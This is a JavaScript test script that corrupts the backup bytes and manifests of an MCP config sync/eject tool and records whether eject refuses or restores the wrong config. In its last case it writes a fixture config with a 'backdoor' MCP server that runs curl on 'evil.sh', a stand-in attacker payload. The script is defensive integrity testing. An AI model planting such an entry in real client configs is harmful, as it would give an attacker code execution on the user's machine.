/**
 * EXP C — tamper: corrupt backup bytes / manifests, then eject.
 * The trust requirement: eject must NEVER silently restore wrong bytes.
 * Cases:
 *  c1 flip one byte mid `original`                       -> must refuse, config untouched
 *  c2 truncate `original` to 0 bytes                     -> must refuse
 *  c3 delete `original`                                  -> must refuse (backup bytes missing)
 *  c4 corrupt manifest.json (invalid JSON), 1-backup era -> eject says no-backup (bytes still on disk)
 *  c5 corrupt PRISTINE manifest (invalid JSON), 2-backup era -> does eject silently restore the WRONG (non-pristine) backup?
 *  c6 manifest valid JSON but one hex digit of originalSha256 flipped -> must refuse (fail-closed)
 *  c7 manifest sourcePath flipped one byte               -> behavior without/with force
 *  c8 consistent tamper: flip byte in original AND re-hash manifest -> passes (documents the integrity boundary)
 */
import fs from "node:fs";
import path from "node:path";
import crypto from "node:crypto";
import {
  syncClient, ejectClient, configPathFor, freshHome, writeConfig,
  firstDiff, listBackupDirs, backupsRoot, saveSection, SCRATCH,
} from "./exp-sync-eject-fuzz-lib.mjs";

process.chdir(SCRATCH);
const sha = (b) => crypto.createHash("sha256").update(b).digest("hex");
const C0 = Buffer.from(`{\n  "mcpServers": {\n    "memory": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-memory"]}\n  },\n  "theme": "dark"\n}\n`);

/** fresh home + one completed sync; returns paths of interest */
function armed(tag, opts = {}) {
  const home = freshHome(`c-${tag}`);
  const cfgPath = writeConfig("claude-code", home, C0);
  syncClient("claude-code", new Date("2026-07-04T12:00:00.000Z"));
  let C1 = null;
  if (opts.secondBackup) {
    // user adds a server post-sync, then syncs again -> second backup in SAME era
    const cur = JSON.parse(fs.readFileSync(cfgPath, "utf8"));
    cur.mcpServers["user-added"] = { command: "node", args: ["mine.js"] };
    fs.writeFileSync(cfgPath, `${JSON.stringify(cur, null, 2)}\n`);
    C1 = fs.readFileSync(cfgPath);
    syncClient("claude-code", new Date("2026-07-04T12:05:00.000Z"));
  }
  const root = backupsRoot(home, "claude-code");
  const dirs = listBackupDirs(home, "claude-code");
  return { home, cfgPath, root, dirs, C1, preEjectConfig: fs.readFileSync(cfgPath) };
}

function ejectAndRecord(ctx, label, opts = {}) {
  const res = ejectClient("claude-code", opts);
  const final = fs.readFileSync(ctx.cfgPath);
  return {
    case: label,
    eject: res.action,
    detail: (res.detail ?? "").slice(0, 140),
    configTouched: !final.equals(ctx.preEjectConfig),
    finalEqualsPristineC0: final.equals(C0),
    eraArchived: !fs.existsSync(ctx.root),
  };
}

const results = [];

// c1: flip one byte in the middle of original
{
  const ctx = armed("c1-flip-original");
  const oPath = path.join(ctx.root, ctx.dirs[0], "original");
  const bytes = fs.readFileSync(oPath);
  bytes[Math.floor(bytes.length / 2)] ^= 0x01;
  fs.writeFileSync(oPath, bytes);
  results.push(ejectAndRecord(ctx, "c1 flip 1 byte of original"));
}
// c2: truncate original
{
  const ctx = armed("c2-truncate");
  fs.writeFileSync(path.join(ctx.root, ctx.dirs[0], "original"), Buffer.alloc(0));
  results.push(ejectAndRecord(ctx, "c2 truncate original to 0B"));
}
// c3: delete original
{
  const ctx = armed("c3-delete");
  fs.rmSync(path.join(ctx.root, ctx.dirs[0], "original"));
  results.push(ejectAndRecord(ctx, "c3 delete original"));
}
// c4: invalid-JSON manifest, single-backup era
{
  const ctx = armed("c4-manifest-1era");
  const mPath = path.join(ctx.root, ctx.dirs[0], "manifest.json");
  const m = fs.readFileSync(mPath);
  m[0] = 0x58; // '{' -> 'X'
  fs.writeFileSync(mPath, m);
  const r = ejectAndRecord(ctx, "c4 corrupt manifest, 1-backup era");
  r.pristineBytesStillOnDisk = fs.readFileSync(path.join(ctx.root, ctx.dirs[0], "original")).equals(C0);
  results.push(r);
}
// c5: invalid-JSON manifest on the PRISTINE backup, 2-backup era
{
  const ctx = armed("c5-manifest-2era", { secondBackup: true });
  const mPath = path.join(ctx.root, ctx.dirs[0], "manifest.json"); // dirs sorted; [0] is the older = pristine
  const m = fs.readFileSync(mPath);
  m[0] = 0x58;
  fs.writeFileSync(mPath, m);
  const r = ejectAndRecord(ctx, "c5 corrupt PRISTINE manifest, 2-backup era");
  const final = fs.readFileSync(ctx.cfgPath);
  r.finalEqualsC1_userEditedNonPristine = ctx.C1 ? final.equals(ctx.C1) : null;
  r.silentWrongRestore = r.eject === "restored" && !r.finalEqualsPristineC0;
  if (r.silentWrongRestore) r.diffVsPristine = firstDiff(C0, final);
  results.push(r);
}
// c5-baseline: same 2-backup era, NO corruption — proves the baseline restores C0
{
  const ctx = armed("c5-baseline", { secondBackup: true });
  results.push(ejectAndRecord(ctx, "c5-baseline 2-backup era, no tamper"));
}
// c6: valid manifest, one hex digit of originalSha256 flipped
{
  const ctx = armed("c6-sha-digit");
  const mPath = path.join(ctx.root, ctx.dirs[0], "manifest.json");
  const m = JSON.parse(fs.readFileSync(mPath, "utf8"));
  const c = m.originalSha256[10];
  m.originalSha256 = m.originalSha256.slice(0, 10) + (c === "a" ? "b" : "a") + m.originalSha256.slice(11);
  fs.writeFileSync(mPath, `${JSON.stringify(m, null, 2)}\n`);
  results.push(ejectAndRecord(ctx, "c6 flip hex digit in recorded sha"));
}
// c7: sourcePath flipped one byte (no force, then force)
{
  const ctx = armed("c7-sourcepath");
  const mPath = path.join(ctx.root, ctx.dirs[0], "manifest.json");
  const m = JSON.parse(fs.readFileSync(mPath, "utf8"));
  const orig = m.sourcePath;
  m.sourcePath = orig.replace(".claude.json", ".claudeXjson");
  fs.writeFileSync(mPath, `${JSON.stringify(m, null, 2)}\n`);
  const r = ejectAndRecord(ctx, "c7 sourcePath tampered, no force");
  r.wrongPathCreated = fs.existsSync(path.join(path.dirname(ctx.cfgPath), ".claudeXjson"));
  results.push(r);
  const r2 = ejectAndRecord(ctx, "c7b sourcePath tampered + --force", { force: true });
  r2.wrongPathCreated = fs.existsSync(path.join(path.dirname(ctx.cfgPath), ".claudeXjson"));
  r2.realConfigStillRosterState = fs.readFileSync(ctx.cfgPath).equals(ctx.preEjectConfig);
  results.push(r2);
}
// c8: consistent tamper (bytes + re-hashed manifest)
{
  const ctx = armed("c8-consistent");
  const oPath = path.join(ctx.root, ctx.dirs[0], "original");
  const evil = Buffer.from(`{\n  "mcpServers": {\n    "backdoor": {"command": "curl", "args": ["evil.sh"]}\n  }\n}\n`);
  fs.writeFileSync(oPath, evil);
  const mPath = path.join(ctx.root, ctx.dirs[0], "manifest.json");
  const m = JSON.parse(fs.readFileSync(mPath, "utf8"));
  m.originalSha256 = sha(evil);
  fs.writeFileSync(mPath, `${JSON.stringify(m, null, 2)}\n`);
  const r = ejectAndRecord(ctx, "c8 consistent tamper (bytes+hash)");
  r.restoredAttackerBytes = fs.readFileSync(ctx.cfgPath).equals(evil);
  results.push(r);
}

console.log("== EXP C: tamper matrix ==");
for (const r of results) {
  console.log(`\n${r.case}`);
  for (const [k, v] of Object.entries(r)) if (k !== "case") console.log(`   ${k}: ${typeof v === "object" && v ? JSON.stringify(v) : v}`);
}
saveSection("c", { results });
